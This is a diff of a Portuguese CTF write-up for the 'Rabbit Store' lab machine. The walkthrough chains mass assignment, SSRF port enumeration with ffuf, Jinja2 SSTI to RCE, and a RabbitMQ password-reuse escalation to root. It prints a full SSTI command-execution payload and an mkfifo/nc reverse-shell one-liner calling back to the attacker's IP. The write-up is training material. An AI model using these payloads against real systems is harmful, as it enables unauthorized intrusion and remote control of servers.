@@ -21,9 +21,9 @@ Uma excelente oportunidade para treinar SSRF, SSTI, RCE e Mass Assignment! além
 
 ## Atacando...
 ### Recon
-Vamos começar pelo bom e velho recon, um recon ruim, a probabilidade de um ataque falhar é alta. Gosto sempre de começar por um recon mais simples, para te ruma noção de quais serviços vou encarar na máquina é só então em cima desses serviços faço um recon mais apurado. 
+Vamos começar pelo bom e velho recon. Um recon ruim, a probabilidade de um ataque falhar é alta. Gosto sempre de começar por um recon mais simples, para ter ruma noção de quais serviços vou encarar na máquina, e só então, em cima desses serviços faço um recon mais apurado. 
 
-Começando pelo recon mais simples, vamos caçar todas as portas portas abertas da máquina:
+Começando pelo recon mais simples, vamos caçar todas as portas abertas da máquina:
 `sudo nmap -sS -v -p- --min-rate 5000 10.66.188.236 -oN nmap/first.txt`
 
 Vamos dar uma olhada nos resultados:
@@ -39,7 +39,7 @@ PORT      STATE SERVICE
 25672/tcp open  unknown
 ```
 Interessante!
-Agora vamos dar um aprofundada a mais nesses serviços:
+Agora vamos dar um aprofundada, nesses serviços:
 `sudo nmap -sCV -v -p22,80,4369,25672 10.66.188.236 -oN nmap/versions.txt`
 Vamos dar uma olhada agora:
 ```
@@ -61,9 +61,9 @@ PORT      STATE SERVICE VERSION
 25672/tcp open  unknown
 Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-Certo, vemos um servidor web ali, um SSH, e vemos um serviço diferente ali!
+Certo, vemos um servidor web ali, um SSH, e vemos uns serviços diferentes ali!
 
-O **epmd**, se você perguntar ao ChatGPT ai, verás que ele vai te dize que se trata de uma linguagem de programação e etc... Deixo esse trabalho da pesquisa e do entendimento do serviço para você, faz parte do nosso trabalho.
+O **epmd**, se você perguntar ao ChatGPT aí, verás que ele vai te dizer que se trata de uma linguagem de programação e etc... Deixo esse trabalho da pesquisa e do entendimento do serviço para você, faz parte do nosso trabalho.
 
 Daremos uma atenção melhor a esse serviço posteriormente, certamente nos ajudará em alguma coisa. Por agora, não conseguiremos muita coisa.
 
@@ -79,7 +79,7 @@ Mas acontece algo curioso, quando registramos uma conta qualquer e tentamos faze
 
 Interessante! Parece que para acessar precisaríamos ter uma espécie de assinatura por parte da empresa!
 
-Pensando nisso, deve ter alguma forma de controle de sessão. Vamos averiguar se há alguma JWT, cookie ou algo do tipo para controle de sessão.
+Pensando nisso, deve ter alguma forma de controlar essa assinatura pela sessão. Vamos averiguar se há algum JWT, cookie ou algo do tipo para controle de sessão.
 
 Com isso em mente, uma olhada no Storage do browser nos revela o "mistério", vemos um JWT!
 
@@ -100,9 +100,9 @@ E olhando o JWT confirmamos o controle:
 
 O campo `subscription` controla a assinatura da conta; 
 
-Já para te adiantar, fazer o *tampering* não funciona, mas se quiser tentar, fique a vontade, pode isar o `jwt_tools` para isso.
+Já para te adiantar, fazer o *tampering* não funciona, mas se quiser tentar, fique a vontade, pode usar o `jwt_tools` para isso.
 
-Certo, se não conseguimos fazer o tampering do JWT, como podemos tetar star esse campo para *active*?
+Certo, se não conseguimos fazer o tampering do JWT, como podemos tentar setar esse campo para *active*?
 
 E porque não um *Mass Assignment*?
 
@@ -119,15 +119,13 @@ Vemos que funcionou! hehe
 Excelente!
 
 ### SSRF
-Neste cenário, talvez você já logo pense: Webshell! Não te julgo, foi o que eu pensei! Hehehe
+Neste cenário, talvez você já logo pense: *Webshell*! Não te julgo, foi o que eu pensei! Hehehe
 
 Você pode tentar webshell ai que não vai, Vai por mim, mas caso ainda não tenha tentado, tente!
 
 Agora eu te convido a pensar: Percebeu o campo ali? "Upload from URL" te lembra alguma possível vulnerabilidade? Veja que ele vai fazer request pra algum lugar.
 
-Talvez você tenha pensado no RFI, mas lembre-se que que seria interessante se conseguíssemos executar uma Webshell ali, ai sim, o RFI seria excelente!
-
-O bom e velho **SSRF** pode entrar ali! O que precisamos é apenas confirmar, e para isso, o Python já de ajuda:
+O bom e velho **SSRF** pode entrar ali! O que precisamos é apenas confirmar, e para isso, o Python já ajuda:
 `python3 -m http.server`
 
 E veja! A requisição bateu!
@@ -138,22 +136,22 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.66.188.236 - - [04/Mar/2026 15:59:34] "GET / HTTP/1.1" 200 -
 ```
 
-Certo! Ao prestarmos atenção na URL, vemos que se trata de uma API! Será que conseguimos acessar a documentação dela? Podemos usar esse SSRF ao nosso favor e tentar achar! Geralmente essas docs ficam em `/api/docs`, vamos tentar dessa forma e ver se conseguimos achar, se não, tentaremos outros diretórios.
+Certo! Ao prestarmos atenção na URL, vemos que se trata de uma API! Será que conseguimos acessar a documentação dela? Podemos usar esse SSRF ao nosso favor e tentar achar! Geralmente essas docs ficam em `/api/docs`, vamos tentar dessa forma e ver se conseguimos achar, e se não, tentaremos outros diretórios.
 
 Mas antes, precisamos saber melhor como funciona essa feature de upload via URL.
 
-Se você testar um pouco verás que quando ela consegue acessar o conteúdo, ela retorna 200 e faz o upload do mesmo anexando na própria aplicação, quando não consegue, retorna erro 500 e não anexa nada.
+Se você testar um pouco verás que quando ela consegue acessar o conteúdo, ela retorna 200 e faz o upload do mesmo, anexando na própria aplicação, quando não consegue, retorna erro 500 e não anexa nada.
 
 Sabendo disso, já sabemos como enumerar serviços internos da aplicação.
-Se você usar o Burp Community pra isso levará uma eternidade, usaremos o `ffuf`, e verás diferença!
+Se você usar o Burp Community para isso levará uma eternidade, usaremos o `ffuf`, e verás diferença!
 
-Usando a feature de upload via URL, faça uma request para `localhos:80/api/docst`, por exemplo:
+Usando a feature de upload via URL, faça uma request para `localhos:80/api/docs`, por exemplo:
 
 ![Request para localhost](../assets/img/rabbit_store/localhost.png)
 
 Usando o Burp ou mesmo o browser (via aba Networks do DevTools), pegue essa request e salve em um arquivo de texto.
 
-Precisamos de uma wordlist com número de todas a portas possíveis, para isso conseguimos usar o própria `bash` para gerar:
+Precisamos de uma wordlist com número de todas a portas possíveis, para isso, conseguimos usar o própria `bash` para gerar:
 `echo {1..65365} | tr " " "\n" > ports.txt`
 
 Agora, edite o arquivo da request da seguinte maneira:
@@ -177,7 +175,7 @@ Connection: keep-alive
 E no `ffuf` podemos fazer o seguinte:
 `ffuf -request req.txt -w ./ports.txt -request-proto http -fc 500`
 
-Já filtraremos requests com status code 500 para facilitar a visualização da output.
+Já filtraremos requests com status code **500** para facilitar a visualização da output.
 
 Aqui está o resultado:
 
@@ -223,7 +221,7 @@ ________________________________________________
 
 Ignoremos a 80 e daremos um olhada com mais carinho nas outras.
 
-Agora que já sabemos quais portas olharmos, podemos testar uma por uma ali nests feature de Upload via URL, baixar o seu conteúdo e ver o que está rodando em cada URL.
+Agora que já sabemos quais portas olharmos, podemos testar uma por uma ali na feature de Upload via URL, baixar o seu conteúdo e ver o que está rodando em cada URL.
 
 E de primeira, se você tentou a 3000 verás que é justamente a documentação da API!
 
@@ -253,37 +251,37 @@ Certo, tentando acessar esse endpoint vemos algo interessante!
 
 ![Get não permitido](../assets/img/rabbit_store/get_nao_permitido.png)
 
-Certo, mudando para POST então, recebemos outro erro:
+Mudando para POST, recebemos outro erro:
 
 ![Internal Error](../assets/img/rabbit_store/internal_error.png)
 
-Certo, algum erro interno do servidor. Toda comunicação anterior da API foi em JSON, vamos mudar ali no Content-Type para JSO:N, talvez possa ser isso:
+Um erro interno do servidor. Toda comunicação anterior da API foi em JSON, vamos mudar ali no `Content-Type` para JSON, talvez possa ser isso:
 
 ![Json](../assets/img/rabbit_store/json.png)
 
-Excelente! Veja que recebemos outro erro indicando que está faltando o parâmetro username!
+Excelente! Veja que recebemos outro erro indicando que está faltando o parâmetro **username**!
 
 Vamos adicionar!
 
 ![Rato espelhado](../assets/img/rabbit_store/rato_espelhado.png)
 
-Certo! 
+Maravilha! 
 
-É nessa hora que um olhar analítico juntamento com uma mente ofensiva fa toda diferença!
+É nessa hora que um olhar analítico juntamente com uma mente ofensiva faz toda a diferença e vamos treinar juntos, não sou nenhum mestre nisso!
 
-Se você reparou bem, o valor do parâmetro **username** foi espelhado ali na resposta; E se você fizer alguns restes (faça e verás), irá perceber que da exata forma que você põe ali o username, ele será refletido ali na página de erro gerada, sem mais modificações. 
+Se você reparou bem, o valor do parâmetro **username** foi espelhado ali na resposta, e se você fizer alguns restes (faça e verás), irá perceber que da exata forma que você põe ali o username, ele será refletido ali na página de erro gerada, sem mais modificações. 
 
 Nessa hora, você pensa: Excelente, XSS!
 
 Mas, por que não tentar algo diferente? Que tal um SSTI? É bem comum em cenários de CTFs.
 
-Um XSS não teria tanto impacto aqui neste cenário, já um SSTI sim! Podendo levar até mesmo a um RCE! Por mais que Se trate de um CTF, sempre pense em IMPACTO.
+Um XSS não teria tanto impacto aqui neste cenário, já um SSTI sim! Podendo levar até mesmo a um RCE! Por mais que se trate de um CTF, sempre pense em IMPACTO e seja orientado a objetivo.
 
 Se você der uma pesquisada em payloads SSTI ai pela internet, como o [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), e tentar alguns, verás que um funciona e que realmente temos um SSTI ali!
 
 ![SSTI Detect](../assets/img/rabbit_store/ssti_detect.png)
 
-Dando uma olhada no site que te indiquei, verás também que esse payload é correspondente a engine Jinja2 (Python)! Isso é excelente! Já nos denuncia qual é a engine por trás da geração desta página de errro.
+Dando uma olhada no site que te indiquei, verás também que esse payload é correspondente a engine **Jinja2 (Python)**! Isso é excelente! Já nos denuncia qual é a engine por trás da geração desta página de erro.
 
 Excelente! Agora que sabemos que se trata da Jinja2, precisamos saber se há alguma forma de executar comados no servidor através desse SSTI, caçando um payload pela internet, você encontra esse aqui:
 `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
@@ -295,8 +293,7 @@ Testando esse payload na aplicação, veja que funcionou! Conseguimos um executa
 Maravilha! Pois partiremos agora para uma shell! Vou usar o payload:
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <seu_ip> 9001 >/tmp/f`
 
-Mas fica a teu critério qual utilizar! Basta colocar no lugar do `id` ali no payload do SSTI e testar!
-
+Mas fica a teu critério qual utilizar! Basta colocar no lugar do `id` ali no payload do SSTI e testar! 
 `{{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <seu_ip> 9001 >/tmp/f').read()}}`
 
 Veja que recebemos a shell!
@@ -401,7 +398,7 @@ rabbitmq
 
 Siga os mesmos passos anteriores para pegar uma shell mais estável!
 
-Ao pesquisarmos um pouco sobre  RabbitMQ, parece que ele expões informações sobre usuários, se tivermos acesso a suas configurações.
+Ao pesquisarmos um pouco sobre  RabbitMQ, parece que ele expõe informações sobre usuários, se tivermos acesso a suas configurações.
 
 Dando uma pesquisada, Vemos  que podemos tentar conversar cm o RabbitMQ usando o `rabbitmqctl`, uma tool CLI usando para conversar com ele via terminal.
 
@@ -438,9 +435,12 @@ root    [administrator]
 
 Era problema de permissionamento!
 
-E olha que interessante, vemos um aviso sobre a senha do usuário `root` estar criptografada e seu algoritmo usado, 
+E olha que interessante, vemos um aviso sobre a senha do usuário `root` estar criptografada e seu algoritmo usado. 
 
-Se pesquisar mais um pouco, vemos que a configuração do RabbitMQ expões hashs, vamos tentar exportá-la!
+Se pesquisar mais um pouco, vemos que a configuração do RabbitMQ expõe hashs, vamos tentar exportá-la!
+
+Já que não podemos quebrar, talvez consigamos fazer algo com ela, usar em algum lugar, não sei, é tentativa e erro.
+
 ```
 rabbitmq@forge:~$ rabbitmqctl export_definitions /tmp/def.json
 Exporting definitions in JSON to a file at "/tmp/def.json" ...
@@ -474,7 +474,7 @@ E olhando bem vemos lá a hash!
 
 ```
 
-Já que não podemos quebrar, talvez consigamos fazer algo com ela, usar em algum lugar, não sei, é tentativa e erro.
+
 
 Certo, nesta hora vemos a importância de se informar o máximo possível sobre o serviço a qual estamos lidando.
 
@@ -510,3 +510,8 @@ root@forge:/var/lib/rabbitmq#
 E funcionou! Hehe! Um caso clássico de **Password Reusage!**
 
 Agora basta pegar a flag root!
+
+--- 
+
+# Conclusão
+Excelente cenário para treinar Web, não acha? Três vulnerabilidades web em uma só máquina! Muito divertido e bastante aprendizado! Muito obrigado! Nos vemos em breve!  E sinta-se à vontade para entrar em contato comigo caso queira!
